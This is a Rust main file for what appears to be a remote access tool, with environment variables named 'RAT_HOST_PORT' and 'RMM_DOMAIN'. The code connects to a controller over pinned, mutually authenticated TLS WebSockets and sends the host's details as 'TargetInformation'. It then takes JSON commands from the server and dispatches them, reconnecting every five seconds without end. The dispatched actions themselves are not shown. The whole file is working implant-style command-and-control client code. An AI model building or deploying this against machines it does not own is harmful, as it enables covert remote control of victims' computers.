use futures_util::{SinkExt, StreamExt};
use std::str::FromStr;
use std::time::Duration;
use sysinfo::System;
use tokio::sync::mpsc;
use tokio_tungstenite::tungstenite::{Message, http};
use tokio_tungstenite::{Connector, connect_async_tls_with_config};

use crate::dispatcher::{CommandMessage, Dispatcher};
use crate::tls::{TlsSettings, build_rustls_client_config};
use crate::utils::Connection;

mod actors;
mod dispatcher;
#[cfg(feature = "chat")]
mod gui;
mod tls;
mod utils;
pub const WS_CHAN_CAP: usize = 128;

#[tokio::main]
async fn main() {
    let host_port = std::env::var("RAT_HOST_PORT").unwrap_or_else(|_| "443".to_string());
    let port_u16 = u16::from_str(&host_port).expect("RAT_HOST_PORT must be a valid u16");

    let use_tls = std::env::var("RAT_USE_TLS")
        .unwrap_or_else(|_| "true".to_string())
        .to_lowercase()
        == "true";

    let connection = Connection::from(i32::from(port_u16), use_tls);

    loop {
        if let Err(e) = run_connection_lifecycle(connection.clone()).await {
            eprintln!("Connection lifecycle error: {e}. Retrying in 5s…");
        } else {
            eprintln!("Connection closed. Reconnecting in 5s…");
        }
        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}

pub async fn run_connection_lifecycle(connection: Connection) -> anyhow::Result<()> {
    if !connection.use_tls {
        anyhow::bail!("Plain WS is disallowed. Set RAT_USE_TLS=true and configure TLS vars.");
    }

    let domain = std::env::var("RMM_DOMAIN")
        .map_err(|_| anyhow::anyhow!("RMM_DOMAIN (DNS name) is required"))?;

    if domain.parse::<std::net::IpAddr>().is_ok() {
        anyhow::bail!("RMM_DOMAIN must be a DNS name, not an IP.");
    }

    let tls_settings = TlsSettings {
        domain: domain.clone(),
        client_cert_pem: std::env::var("RMM_TLS_CLIENT_CERT")
            .map_err(|_| anyhow::anyhow!("RMM_TLS_CLIENT_CERT is required"))?,
        client_key_pem: std::env::var("RMM_TLS_CLIENT_KEY")
            .map_err(|_| anyhow::anyhow!("RMM_TLS_CLIENT_KEY is required"))?,
        spki_pins_sha256_b64: std::env::var("RMM_TLS_SPKI_SHA256")
            .map_err(|_| anyhow::anyhow!("RMM_TLS_SPKI_SHA256 is required"))?
            .split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect(),
        use_native_roots: true,
    };
    let tls_cfg = build_rustls_client_config(&tls_settings)?;
    let connector = Some(Connector::Rustls(tls_cfg));

    let client_id = System::host_name().unwrap_or_else(|| "unknown_client".to_string());

    let url = url::Url::parse(&format!(
        "wss://{}:{}/ws/{}",
        tls_settings.domain, connection.port, client_id
    ))?;

    let request = http::Request::builder()
        .uri(url.to_string())
        .header("Host", &domain)
        .body(())?;

    let (ws_stream, _response) =
        connect_async_tls_with_config(request, None, false, connector).await?;
    eprintln!("WebSocket(TLS) handshake OK with {}", domain);

    let (mut writer, mut reader) = ws_stream.split();

    let (ws_sender, mut ws_receiver) = mpsc::channel::<Message>(WS_CHAN_CAP);
    let writer_task = tokio::spawn(async move {
        while let Some(out) = ws_receiver.recv().await {
            if writer.send(out).await.is_err() {
                eprintln!("WebSocket write failed. Closing writer task.");
                break;
            }
        }
    });

    let dispatcher = Dispatcher::new(ws_sender.clone());

    let sysinfo = crate::utils::TargetInformation::get().to_string();
    ws_sender.send(Message::Text(sysinfo)).await?;

    while let Some(msg) = reader.next().await {
        let msg = msg?;
        match msg {
            Message::Text(text) => match serde_json::from_str::<CommandMessage>(&text) {
                Ok(cmd) => {
                    if let Err(e) = dispatcher.dispatch(cmd).await {
                        eprintln!("Dispatch error: {e}");
                    }
                }
                Err(e) => eprintln!("Bad command JSON: {e}; raw={text}"),
            },
            Message::Close(_) => {
                break;
            }
            _ => {}
        }
    }

    drop(ws_sender);
    let _ = writer_task.await;

    Ok(())
}
